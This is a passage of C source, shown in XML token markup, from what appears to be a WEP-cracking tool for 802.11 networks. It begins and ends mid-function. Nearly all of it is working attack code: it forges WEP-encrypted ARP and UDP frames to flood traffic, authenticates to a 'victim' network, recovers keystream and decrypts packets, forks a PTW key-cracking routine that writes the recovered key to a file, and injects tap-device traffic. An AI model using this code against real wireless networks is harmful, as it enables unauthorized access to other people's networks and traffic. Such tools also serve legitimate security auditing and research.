decl_stmt|;
name|decryptstate
operator|.
name|prgainfo
operator|.
name|prga
index|[
name|decryptstate
operator|.
name|prgainfo
operator|.
name|len
operator|-
literal|1
index|]
operator|++
expr_stmt|;
if|#
directive|if
literal|0
block|if (decryptstate.prgainfo.prga[decryptstate.prgainfo.len-1] == 0) { 			printf("Can't decrpyt!\n"); 			exit(1); 		}
endif|#
directive|endif
name|decryptstate
operator|.
name|fragstate
operator|.
name|wh
operator|.
name|i_addr3
index|[
literal|5
index|]
operator|=
name|decryptstate
operator|.
name|prgainfo
operator|.
name|prga
index|[
name|decryptstate
operator|.
name|prgainfo
operator|.
name|len
operator|-
literal|1
index|]
expr_stmt|;
name|decryptstate
operator|.
name|fragstate
operator|.
name|waiting_relay
operator|=
literal|0
expr_stmt|;
name|decryptstate
operator|.
name|fragstate
operator|.
name|ptr
operator|=
name|decryptstate
operator|.
name|fragstate
operator|.
name|data
expr_stmt|;
name|seq
operator|=
operator|(
name|unsigned
name|short
operator|*
operator|)
operator|&
name|decryptstate
operator|.
name|fragstate
operator|.
name|wh
operator|.
name|i_seq
expr_stmt|;
operator|*
name|seq
operator|=
name|fnseq
argument_list|(
literal|0
argument_list|,
name|txstate
operator|.
name|psent
argument_list|)
expr_stmt|;
block|}
name|send_fragment
argument_list|(
name|tx
argument_list|,
operator|&
name|decryptstate
operator|.
name|fragstate
argument_list|,
operator|&
name|decryptstate
operator|.
name|prgainfo
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|flood_inet
parameter_list|(
name|tx
parameter_list|)
block|{
specifier|static
name|int
name|send_arp
init|=
operator|-
literal|1
decl_stmt|;
specifier|static
name|unsigned
name|char
name|arp_pkt
index|[
literal|128
index|]
decl_stmt|;
specifier|static
name|int
name|arp_len
decl_stmt|;
specifier|static
name|unsigned
name|char
name|udp_pkt
index|[
literal|128
index|]
decl_stmt|;
specifier|static
name|int
name|udp_len
decl_stmt|;
specifier|static
name|struct
name|timeval
name|last_ip
decl_stmt|;
comment|// need to init packets...
if|if
condition|(
name|send_arp
operator|==
operator|-
literal|1
condition|)
block|{
name|unsigned
name|char
modifier|*
name|body
decl_stmt|;
name|unsigned
name|char
modifier|*
name|ptr
decl_stmt|;
name|struct
name|ieee80211_frame
modifier|*
name|wh
decl_stmt|;
name|struct
name|ip
modifier|*
name|ih
decl_stmt|;
name|struct
name|udphdr
modifier|*
name|uh
decl_stmt|;
name|memset
argument_list|(
name|arp_pkt
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|arp_pkt
argument_list|)
argument_list|)
expr_stmt|;
name|memset
argument_list|(
name|udp_pkt
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|udp_pkt
argument_list|)
argument_list|)
expr_stmt|;
comment|// construct ARP
name|wh
operator|=
operator|(
expr|struct
name|ieee80211_frame
operator|*
operator|)
name|arp_pkt
expr_stmt|;
name|fill_basic
argument_list|(
name|wh
argument_list|)
expr_stmt|;
name|wh
operator|->
name|i_fc
index|[
literal|0
index|]
operator||=
name|IEEE80211_FC0_TYPE_DATA
expr_stmt|;
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator||=
name|IEEE80211_FC1_WEP
operator||
name|IEEE80211_FC1_DIR_TODS
expr_stmt|;
name|memset
argument_list|(
name|wh
operator|->
name|i_addr3
argument_list|,
literal|0xff
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|body
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|wh
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
expr_stmt|;
name|ptr
operator|=
name|body
expr_stmt|;
name|ptr
operator|+=
literal|4
expr_stmt|;
comment|// iv
name|do_llc
argument_list|(
name|ptr
argument_list|,
name|ETHERTYPE_ARP
argument_list|)
expr_stmt|;
name|ptr
operator|+=
literal|8
expr_stmt|;
name|do_arp
argument_list|(
name|ptr
argument_list|,
name|ARPOP_REQUEST
argument_list|,
name|mymac
argument_list|,
name|myip
argument_list|,
literal|"\x00\x00\x00\x00\x00\x00"
argument_list|,
name|netip
argument_list|)
expr_stmt|;
name|wepify
argument_list|(
name|body
argument_list|,
literal|8
operator|+
literal|8
operator|+
literal|20
argument_list|)
expr_stmt|;
name|arp_len
operator|=
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
operator|+
literal|4
operator|+
literal|8
operator|+
literal|8
operator|+
literal|20
operator|+
literal|4
expr_stmt|;
name|assert
argument_list|(
name|arp_len
operator|<
sizeof|sizeof
argument_list|(
name|arp_pkt
argument_list|)
argument_list|)
expr_stmt|;
comment|// construct UDP
name|wh
operator|=
operator|(
expr|struct
name|ieee80211_frame
operator|*
operator|)
name|udp_pkt
expr_stmt|;
name|fill_basic
argument_list|(
name|wh
argument_list|)
expr_stmt|;
name|wh
operator|->
name|i_fc
index|[
literal|0
index|]
operator||=
name|IEEE80211_FC0_TYPE_DATA
expr_stmt|;
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator||=
name|IEEE80211_FC1_WEP
operator||
name|IEEE80211_FC1_DIR_TODS
expr_stmt|;
name|memcpy
argument_list|(
name|wh
operator|->
name|i_addr3
argument_list|,
name|rtrmac
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|body
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|wh
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
expr_stmt|;
name|ptr
operator|=
name|body
expr_stmt|;
name|ptr
operator|+=
literal|4
expr_stmt|;
comment|// iv
name|do_llc
argument_list|(
name|ptr
argument_list|,
name|ETHERTYPE_IP
argument_list|)
expr_stmt|;
name|ptr
operator|+=
literal|8
expr_stmt|;
name|ih
operator|=
operator|(
expr|struct
name|ip
operator|*
operator|)
name|ptr
expr_stmt|;
name|ih
operator|->
name|ip_hl
operator|=
literal|5
expr_stmt|;
name|ih
operator|->
name|ip_v
operator|=
literal|4
expr_stmt|;
name|ih
operator|->
name|ip_tos
operator|=
literal|0
expr_stmt|;
name|ih
operator|->
name|ip_len
operator|=
name|htons
argument_list|(
literal|20
operator|+
literal|8
operator|+
literal|5
argument_list|)
expr_stmt|;
name|ih
operator|->
name|ip_id
operator|=
name|htons
argument_list|(
literal|666
argument_list|)
expr_stmt|;
name|ih
operator|->
name|ip_off
operator|=
literal|0
expr_stmt|;
name|ih
operator|->
name|ip_ttl
operator|=
literal|128
expr_stmt|;
name|ih
operator|->
name|ip_p
operator|=
name|IPPROTO_UDP
expr_stmt|;
name|ih
operator|->
name|ip_sum
operator|=
literal|0
expr_stmt|;
name|inet_aton
argument_list|(
name|myip
argument_list|,
operator|&
name|ih
operator|->
name|ip_src
argument_list|)
expr_stmt|;
name|inet_aton
argument_list|(
name|floodip
argument_list|,
operator|&
name|ih
operator|->
name|ip_dst
argument_list|)
expr_stmt|;
name|ih
operator|->
name|ip_sum
operator|=
name|in_cksum
argument_list|(
operator|(
name|unsigned
name|short
operator|*
operator|)
name|ih
argument_list|,
literal|20
argument_list|)
expr_stmt|;
name|ptr
operator|+=
literal|20
expr_stmt|;
name|uh
operator|=
operator|(
expr|struct
name|udphdr
operator|*
operator|)
name|ptr
expr_stmt|;
name|uh
operator|->
name|uh_sport
operator|=
name|htons
argument_list|(
name|floodsport
argument_list|)
expr_stmt|;
name|uh
operator|->
name|uh_dport
operator|=
name|htons
argument_list|(
name|floodport
argument_list|)
expr_stmt|;
name|uh
operator|->
name|uh_ulen
operator|=
name|htons
argument_list|(
literal|8
operator|+
literal|5
argument_list|)
expr_stmt|;
name|uh
operator|->
name|uh_sum
operator|=
literal|0
expr_stmt|;
name|ptr
operator|+=
literal|8
expr_stmt|;
name|strcpy
argument_list|(
name|ptr
argument_list|,
literal|"sorbo"
argument_list|)
expr_stmt|;
name|uh
operator|->
name|uh_sum
operator|=
name|udp_checksum
argument_list|(
name|ptr
operator|-
literal|8
argument_list|,
literal|8
operator|+
literal|5
argument_list|,
operator|&
name|ih
operator|->
name|ip_src
argument_list|,
operator|&
name|ih
operator|->
name|ip_dst
argument_list|)
expr_stmt|;
name|wepify
argument_list|(
name|body
argument_list|,
literal|8
operator|+
literal|20
operator|+
literal|8
operator|+
literal|5
argument_list|)
expr_stmt|;
name|udp_len
operator|=
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
operator|+
literal|4
operator|+
literal|8
operator|+
literal|20
operator|+
literal|8
operator|+
literal|5
operator|+
literal|4
expr_stmt|;
name|assert
argument_list|(
name|udp_len
operator|<
sizeof|sizeof
argument_list|(
name|udp_pkt
argument_list|)
argument_list|)
expr_stmt|;
comment|// bootstrap
name|send_arp
operator|=
literal|1
expr_stmt|;
name|memset
argument_list|(
operator|&
name|last_ip
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|last_ip
argument_list|)
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|send_arp
operator|==
literal|1
condition|)
block|{
name|struct
name|timeval
name|now
decl_stmt|;
name|unsigned
name|long
name|sec
decl_stmt|;
if|if
condition|(
name|gettimeofday
argument_list|(
operator|&
name|now
argument_list|,
name|NULL
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"gettimeofday()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|sec
operator|=
name|now
operator|.
name|tv_sec
operator|-
name|last_ip
operator|.
name|tv_sec
expr_stmt|;
if|if
condition|(
name|sec
operator|<
literal|5
condition|)
return|return;
name|send_frame
argument_list|(
name|tx
argument_list|,
name|arp_pkt
argument_list|,
name|arp_len
argument_list|)
expr_stmt|;
name|send_arp
operator|=
literal|0
expr_stmt|;
block|}
elseif|else
if|if
condition|(
name|send_arp
operator|==
literal|0
condition|)
block|{
if|if
condition|(
name|gettimeofday
argument_list|(
operator|&
name|last_ip
argument_list|,
name|NULL
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"gettimeofday()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|send_frame
argument_list|(
name|tx
argument_list|,
name|udp_pkt
argument_list|,
name|udp_len
argument_list|)
expr_stmt|;
name|send_arp
operator|=
literal|1
expr_stmt|;
block|}
else|else
name|assert
argument_list|(
literal|0
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|send_arp
parameter_list|(
name|int
name|tx
parameter_list|,
name|unsigned
name|short
name|op
parameter_list|,
name|unsigned
name|char
modifier|*
name|srcip
parameter_list|,
name|unsigned
name|char
modifier|*
name|srcmac
parameter_list|,
name|unsigned
name|char
modifier|*
name|dstip
parameter_list|,
name|unsigned
name|char
modifier|*
name|dstmac
parameter_list|)
block|{
specifier|static
name|unsigned
name|char
name|arp_pkt
index|[
literal|128
index|]
decl_stmt|;
name|unsigned
name|char
modifier|*
name|body
decl_stmt|;
name|unsigned
name|char
modifier|*
name|ptr
decl_stmt|;
name|struct
name|ieee80211_frame
modifier|*
name|wh
decl_stmt|;
name|int
name|arp_len
decl_stmt|;
name|memset
argument_list|(
name|arp_pkt
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|arp_pkt
argument_list|)
argument_list|)
expr_stmt|;
comment|// construct ARP
name|wh
operator|=
operator|(
expr|struct
name|ieee80211_frame
operator|*
operator|)
name|arp_pkt
expr_stmt|;
name|fill_basic
argument_list|(
name|wh
argument_list|)
expr_stmt|;
name|wh
operator|->
name|i_fc
index|[
literal|0
index|]
operator||=
name|IEEE80211_FC0_TYPE_DATA
expr_stmt|;
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator||=
name|IEEE80211_FC1_WEP
operator||
name|IEEE80211_FC1_DIR_TODS
expr_stmt|;
name|memset
argument_list|(
name|wh
operator|->
name|i_addr3
argument_list|,
literal|0xff
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|body
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|wh
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
expr_stmt|;
name|ptr
operator|=
name|body
expr_stmt|;
name|ptr
operator|+=
literal|4
expr_stmt|;
comment|// iv
name|do_llc
argument_list|(
name|ptr
argument_list|,
name|ETHERTYPE_ARP
argument_list|)
expr_stmt|;
name|ptr
operator|+=
literal|8
expr_stmt|;
name|do_arp
argument_list|(
name|ptr
argument_list|,
name|op
argument_list|,
name|srcmac
argument_list|,
name|srcip
argument_list|,
name|dstmac
argument_list|,
name|dstip
argument_list|)
expr_stmt|;
name|wepify
argument_list|(
name|body
argument_list|,
literal|8
operator|+
literal|8
operator|+
literal|20
argument_list|)
expr_stmt|;
name|arp_len
operator|=
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
operator|+
literal|4
operator|+
literal|8
operator|+
literal|8
operator|+
literal|20
operator|+
literal|4
expr_stmt|;
name|assert
argument_list|(
name|arp_len
operator|<
sizeof|sizeof
argument_list|(
name|arp_pkt
argument_list|)
argument_list|)
expr_stmt|;
name|send_frame
argument_list|(
name|tx
argument_list|,
name|arp_pkt
argument_list|,
name|arp_len
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|can_write
parameter_list|(
name|int
name|tx
parameter_list|)
block|{
specifier|static
name|char
name|arp_ip
index|[
literal|16
index|]
decl_stmt|;
switch|switch
condition|(
name|state
condition|)
block|{
case|case
name|FOUND_VICTIM
case|:
name|send_auth
argument_list|(
name|tx
argument_list|)
expr_stmt|;
name|state
operator|=
name|SENDING_AUTH
expr_stmt|;
break|break;
case|case
name|GOT_AUTH
case|:
name|send_assoc
argument_list|(
name|tx
argument_list|)
expr_stmt|;
name|state
operator|=
name|SENDING_ASSOC
expr_stmt|;
break|break;
case|case
name|GOT_ASSOC
case|:
if|if
condition|(
name|prgainfo
operator|.
name|prga
operator|&&
name|prgainfo
operator|.
name|len
operator|<
name|min_prga
condition|)
block|{
name|discover_prga
argument_list|(
name|tx
argument_list|)
expr_stmt|;
break|break;
block|}
if|if
condition|(
name|decryptstate
operator|.
name|cipher
condition|)
block|{
name|decrypt
argument_list|(
name|tx
argument_list|)
expr_stmt|;
break|break;
block|}
if|if
condition|(
operator|!
name|prgainfo
operator|.
name|prga
condition|)
break|break;
if|if
condition|(
name|taptx_len
condition|)
block|{
name|send_frame
argument_list|(
name|tx
argument_list|,
name|taptx
argument_list|,
name|taptx_len
argument_list|)
expr_stmt|;
name|taptx_len
operator|=
literal|0
expr_stmt|;
break|break;
block|}
comment|// try to find rtr mac addr
if|if
condition|(
name|netip
operator|&&
operator|!
name|rtrmac
condition|)
block|{
name|char
modifier|*
name|ptr
decl_stmt|;
name|strcpy
argument_list|(
name|arp_ip
argument_list|,
name|netip
argument_list|)
expr_stmt|;
if|if
condition|(
operator|!
name|netip_arg
condition|)
block|{
name|ptr
operator|=
name|strchr
argument_list|(
name|arp_ip
argument_list|,
literal|'.'
argument_list|)
expr_stmt|;
name|assert
argument_list|(
name|ptr
argument_list|)
expr_stmt|;
name|ptr
operator|=
name|strchr
argument_list|(
operator|++
name|ptr
argument_list|,
literal|'.'
argument_list|)
expr_stmt|;
name|assert
argument_list|(
name|ptr
argument_list|)
expr_stmt|;
name|ptr
operator|=
name|strchr
argument_list|(
operator|++
name|ptr
argument_list|,
literal|'.'
argument_list|)
expr_stmt|;
name|assert
argument_list|(
name|ptr
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
operator|++
name|ptr
argument_list|,
literal|"1"
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|gettimeofday
argument_list|(
operator|&
name|arpsend
argument_list|,
name|NULL
argument_list|)
operator|==
operator|-
literal|1
condition|)
name|err
argument_list|(
literal|1
argument_list|,
literal|"gettimeofday()"
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Sending arp request for: %s\n"
argument_list|,
name|arp_ip
argument_list|)
expr_stmt|;
name|send_arp
argument_list|(
name|tx
argument_list|,
name|ARPOP_REQUEST
argument_list|,
name|myip
argument_list|,
name|mymac
argument_list|,
name|arp_ip
argument_list|,
literal|"\x00\x00\x00\x00\x00\x00"
argument_list|)
expr_stmt|;
comment|// XXX lame
name|rtrmac
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
literal|1
expr_stmt|;
break|break;
block|}
comment|// need to generate traffic...
if|if
condition|(
name|rtrmac
operator|>
operator|(
name|unsigned
name|char
operator|*
operator|)
literal|1
operator|&&
name|netip
condition|)
block|{
if|if
condition|(
name|floodip
condition|)
name|flood_inet
argument_list|(
name|tx
argument_list|)
expr_stmt|;
else|else
block|{
comment|// XXX lame technique... anyway... im
comment|// only interested in flood_inet...
comment|// could ping broadcast....
name|send_arp
argument_list|(
name|tx
argument_list|,
name|ARPOP_REQUEST
argument_list|,
name|myip
argument_list|,
name|mymac
argument_list|,
name|arp_ip
argument_list|,
literal|"\x00\x00\x00\x00\x00\x00"
argument_list|)
expr_stmt|;
block|}
break|break;
block|}
break|break;
block|}
block|}
end_function

begin_function
name|void
name|save_key
parameter_list|(
name|unsigned
name|char
modifier|*
name|key
parameter_list|,
name|int
name|len
parameter_list|)
block|{
name|char
name|tmp
index|[
literal|16
index|]
decl_stmt|;
name|char
name|k
index|[
literal|64
index|]
decl_stmt|;
name|int
name|fd
decl_stmt|;
name|int
name|rd
decl_stmt|;
name|assert
argument_list|(
name|len
operator|*
literal|3
operator|<
sizeof|sizeof
argument_list|(
name|k
argument_list|)
argument_list|)
expr_stmt|;
name|k
index|[
literal|0
index|]
operator|=
literal|0
expr_stmt|;
while|while
condition|(
name|len
operator|--
condition|)
block|{
name|sprintf
argument_list|(
name|tmp
argument_list|,
literal|"%.2X"
argument_list|,
operator|*
name|key
operator|++
argument_list|)
expr_stmt|;
name|strcat
argument_list|(
name|k
argument_list|,
name|tmp
argument_list|)
expr_stmt|;
if|if
condition|(
name|len
condition|)
name|strcat
argument_list|(
name|k
argument_list|,
literal|":"
argument_list|)
expr_stmt|;
block|}
name|fd
operator|=
name|open
argument_list|(
name|KEY_FILE
argument_list|,
name|O_WRONLY
operator||
name|O_CREAT
operator||
literal|0644
argument_list|)
expr_stmt|;
if|if
condition|(
name|fd
operator|==
operator|-
literal|1
condition|)
name|err
argument_list|(
literal|1
argument_list|,
literal|"open()"
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"\nKey: %s\n"
argument_list|,
name|k
argument_list|)
expr_stmt|;
name|rd
operator|=
name|write
argument_list|(
name|fd
argument_list|,
name|k
argument_list|,
name|strlen
argument_list|(
name|k
argument_list|)
argument_list|)
expr_stmt|;
if|if
condition|(
name|rd
operator|==
operator|-
literal|1
condition|)
name|err
argument_list|(
literal|1
argument_list|,
literal|"write()"
argument_list|)
expr_stmt|;
if|if
condition|(
name|rd
operator|!=
name|strlen
argument_list|(
name|k
argument_list|)
condition|)
name|errx
argument_list|(
literal|1
argument_list|,
literal|"write %d/%d\n"
argument_list|,
name|rd
argument_list|,
name|strlen
argument_list|(
name|k
argument_list|)
argument_list|)
expr_stmt|;
name|close
argument_list|(
name|fd
argument_list|)
expr_stmt|;
block|}
end_function

begin_define
define|#
directive|define
name|KEYLIMIT
value|(1000000)
end_define

begin_function
name|int
name|do_crack
parameter_list|(
name|void
parameter_list|)
block|{
name|unsigned
name|char
name|key
index|[
name|PTW_KEYHSBYTES
index|]
decl_stmt|;
if|if
condition|(
name|PTW_computeKey
argument_list|(
name|ptw
argument_list|,
name|key
argument_list|,
literal|13
argument_list|,
name|KEYLIMIT
argument_list|)
operator|==
literal|1
condition|)
block|{
name|save_key
argument_list|(
name|key
argument_list|,
literal|13
argument_list|)
expr_stmt|;
return|return
literal|1
return|;
block|}
if|if
condition|(
name|PTW_computeKey
argument_list|(
name|ptw
argument_list|,
name|key
argument_list|,
literal|5
argument_list|,
name|KEYLIMIT
operator|/
literal|10
argument_list|)
operator|==
literal|1
condition|)
block|{
name|save_key
argument_list|(
name|key
argument_list|,
literal|5
argument_list|)
expr_stmt|;
return|return
literal|1
return|;
block|}
return|return
literal|0
return|;
block|}
end_function

begin_function
name|void
name|try_crack
parameter_list|()
block|{
if|if
condition|(
name|crack_pid
condition|)
block|{
name|printf
argument_list|(
literal|"\n"
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Warning... previous crack still running!\n"
argument_list|)
expr_stmt|;
name|kill_crack
argument_list|()
expr_stmt|;
block|}
if|if
condition|(
name|weplog
operator|.
name|fd
condition|)
block|{
if|if
condition|(
name|fsync
argument_list|(
name|weplog
operator|.
name|fd
argument_list|)
operator|==
operator|-
literal|1
condition|)
name|err
argument_list|(
literal|1
argument_list|,
literal|"fsync"
argument_list|)
expr_stmt|;
block|}
name|crack_pid
operator|=
name|fork
argument_list|()
expr_stmt|;
if|if
condition|(
name|crack_pid
operator|==
operator|-
literal|1
condition|)
name|err
argument_list|(
literal|1
argument_list|,
literal|"fork"
argument_list|)
expr_stmt|;
comment|// child
if|if
condition|(
name|crack_pid
operator|==
literal|0
condition|)
block|{
if|if
condition|(
operator|!
name|do_crack
argument_list|()
condition|)
name|printf
argument_list|(
literal|"\nCrack unsuccessful\n"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
comment|// parent
name|printf
argument_list|(
literal|"\n"
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Starting crack PID=%d\n"
argument_list|,
name|crack_pid
argument_list|)
expr_stmt|;
if|if
condition|(
name|gettimeofday
argument_list|(
operator|&
name|crack_start
argument_list|,
name|NULL
argument_list|)
operator|==
operator|-
literal|1
condition|)
name|err
argument_list|(
literal|1
argument_list|,
literal|"gettimeofday"
argument_list|)
expr_stmt|;
name|wep_thresh
operator|+=
name|thresh_incr
expr_stmt|;
block|}
end_function

begin_function
name|void
name|open_tap
parameter_list|()
block|{
name|struct
name|stat
name|st
decl_stmt|;
name|int
name|s
decl_stmt|;
name|struct
name|ifreq
name|ifr
decl_stmt|;
name|unsigned
name|int
name|flags
decl_stmt|;
name|tapfd
operator|=
name|open
argument_list|(
name|TAP_DEV
argument_list|,
name|O_RDWR
argument_list|)
expr_stmt|;
if|if
condition|(
name|tapfd
operator|==
operator|-
literal|1
condition|)
block|{
name|printf
argument_list|(
literal|"Can't open tap: %s\n"
argument_list|,
name|strerror
argument_list|(
name|errno
argument_list|)
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|fstat
argument_list|(
name|tapfd
argument_list|,
operator|&
name|st
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"fstat()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
comment|// feer
name|strcpy
argument_list|(
name|tapdev
argument_list|,
name|devname
argument_list|(
name|st
operator|.
name|st_rdev
argument_list|,
name|S_IFCHR
argument_list|)
argument_list|)
expr_stmt|;
name|s
operator|=
name|socket
argument_list|(
name|PF_INET
argument_list|,
name|SOCK_DGRAM
argument_list|,
literal|0
argument_list|)
expr_stmt|;
if|if
condition|(
name|s
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"socket()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
comment|// MTU
name|memset
argument_list|(
operator|&
name|ifr
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|ifr
argument_list|)
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
name|ifr
operator|.
name|ifr_name
argument_list|,
name|tapdev
argument_list|)
expr_stmt|;
name|ifr
operator|.
name|ifr_mtu
operator|=
literal|1500
expr_stmt|;
if|if
condition|(
name|ioctl
argument_list|(
name|s
argument_list|,
name|SIOCSIFMTU
argument_list|,
operator|&
name|ifr
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"ioctl(SIOCSIFMTU)"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
comment|// set iface up
name|memset
argument_list|(
operator|&
name|ifr
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|ifr
argument_list|)
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
name|ifr
operator|.
name|ifr_name
argument_list|,
name|tapdev
argument_list|)
expr_stmt|;
if|if
condition|(
name|ioctl
argument_list|(
name|s
argument_list|,
name|SIOCGIFFLAGS
argument_list|,
operator|&
name|ifr
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"ioctl(SIOCGIFFLAGS)"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|flags
operator|=
operator|(
name|ifr
operator|.
name|ifr_flags
operator|&
literal|0xffff
operator|)
operator||
operator|(
name|ifr
operator|.
name|ifr_flagshigh
operator|<<
literal|16
operator|)
expr_stmt|;
name|flags
operator||=
name|IFF_UP
expr_stmt|;
name|memset
argument_list|(
operator|&
name|ifr
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|ifr
argument_list|)
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
name|ifr
operator|.
name|ifr_name
argument_list|,
name|tapdev
argument_list|)
expr_stmt|;
name|ifr
operator|.
name|ifr_flags
operator|=
name|flags
operator|&
literal|0xffff
expr_stmt|;
name|ifr
operator|.
name|ifr_flagshigh
operator|=
name|flags
operator|>>
literal|16
expr_stmt|;
if|if
condition|(
name|ioctl
argument_list|(
name|s
argument_list|,
name|SIOCSIFFLAGS
argument_list|,
operator|&
name|ifr
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"ioctl(SIOCSIFFLAGS)"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|close
argument_list|(
name|s
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Opened tap device: %s\n"
argument_list|,
name|tapdev
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|read_tap
parameter_list|()
block|{
name|unsigned
name|char
name|buf
index|[
literal|4096
index|]
decl_stmt|;
name|struct
name|ether_header
modifier|*
name|eh
decl_stmt|;
name|struct
name|ieee80211_frame
modifier|*
name|wh
decl_stmt|;
name|int
name|rd
decl_stmt|;
name|unsigned
name|char
modifier|*
name|ptr
decl_stmt|,
modifier|*
name|body
decl_stmt|;
name|int
name|dlen
decl_stmt|;
name|rd
operator|=
name|read
argument_list|(
name|tapfd
argument_list|,
name|buf
argument_list|,
sizeof|sizeof
argument_list|(
name|buf
argument_list|)
argument_list|)
expr_stmt|;
if|if
condition|(
name|rd
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"read()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|dlen
operator|=
name|rd
operator|-
sizeof|sizeof
argument_list|(
operator|*
name|eh
argument_list|)
expr_stmt|;
name|assert
argument_list|(
name|dlen
operator|>
literal|0
argument_list|)
expr_stmt|;
if|if
condition|(
name|dlen
operator|+
literal|8
operator|>
name|prgainfo
operator|.
name|len
condition|)
block|{
name|printf
argument_list|(
literal|"\n"
argument_list|)
expr_stmt|;
comment|// XXX lame message...
name|time_print
argument_list|(
literal|"Sorry... want to send %d but only got %d prga\n"
argument_list|,
name|dlen
argument_list|,
name|prgainfo
operator|.
name|len
argument_list|)
expr_stmt|;
return|return;
block|}
if|if
condition|(
name|taptx_len
condition|)
block|{
name|printf
argument_list|(
literal|"\n"
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Sorry... overflow in TAP queue [of 1 packet =P] overwriting\n"
argument_list|)
expr_stmt|;
comment|// XXX could not read instead and get rid of it in select...
block|}
name|assert
argument_list|(
name|rd
operator|<
operator|(
sizeof|sizeof
argument_list|(
name|buf
argument_list|)
operator|-
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
operator|-
literal|8
operator|-
literal|8
operator|)
argument_list|)
expr_stmt|;
name|eh
operator|=
operator|(
expr|struct
name|ether_header
operator|*
operator|)
name|buf
expr_stmt|;
name|wh
operator|=
operator|(
expr|struct
name|ieee80211_frame
operator|*
operator|)
name|taptx
expr_stmt|;
name|memset
argument_list|(
name|wh
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
argument_list|)
expr_stmt|;
name|fill_basic
argument_list|(
name|wh
argument_list|)
expr_stmt|;
name|wh
operator|->
name|i_fc
index|[
literal|0
index|]
operator||=
name|IEEE80211_FC0_TYPE_DATA
expr_stmt|;
name|wh
operator|->
name|i_fc
index|[
literal|1
index|]
operator||=
name|IEEE80211_FC1_WEP
operator||
name|IEEE80211_FC1_DIR_TODS
expr_stmt|;
name|memcpy
argument_list|(
name|wh
operator|->
name|i_addr2
argument_list|,
name|eh
operator|->
name|ether_shost
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
name|wh
operator|->
name|i_addr3
argument_list|,
name|eh
operator|->
name|ether_dhost
argument_list|,
literal|6
argument_list|)
expr_stmt|;
name|body
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|wh
operator|+
sizeof|sizeof
argument_list|(
operator|*
name|wh
argument_list|)
expr_stmt|;
name|ptr
operator|=
name|body
expr_stmt|;
name|ptr
operator|+=
literal|4
expr_stmt|;
comment|// iv
name|do_llc
argument_list|(
name|ptr
argument_list|,
name|ntohs
argument_list|(
name|eh
